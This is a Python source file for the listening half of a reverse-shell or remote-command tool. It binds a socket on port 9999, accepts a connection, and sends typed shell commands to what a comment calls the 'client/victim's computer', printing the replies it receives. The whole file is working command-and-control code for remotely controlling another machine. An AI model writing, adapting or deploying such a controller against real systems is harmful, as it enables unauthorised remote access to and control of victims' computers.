# dependencies
import sys
import socket


# function
## create a socket ( connect two pcs )
def create_socket():
    global host
    global port
    global sock

    try:
        host = ''
        port = 9999
        sock = socket.socket()
        print('Socket has been created...')
    except socket.error as err:
        print(f'Failed to create socket: {err}')


## binding the socket and listening for connection
def bind_socket():
    global host
    global port
    global sock

    try:
        sock.bind((host, port))
        sock.listen(5)
        print(f'Binding the socket at PORT: {port}')
    except socket.error as err:
        print(f'Socket binding failed: {err}\nRetrying...')
        bind_socket()


## establish connection with a client ( socket must be listening )
def socket_accept():
    global sock

    conn, address = sock.accept()
    print(f'Connection has been established! | IP: {address[0]} | PORT: {address[1]}')

    send_command(conn)
    conn.close()


# send command to client/victim's computer
def send_command(conn):
    global sock

    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            sock.close()
            sys.exit()

        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            resp = str(conn.recv(1024), 'utf-8')
            print(resp, end='')


## main
def main():
    create_socket()
    bind_socket()
    socket_accept()


# run
if __name__ == '__main__':
    main()

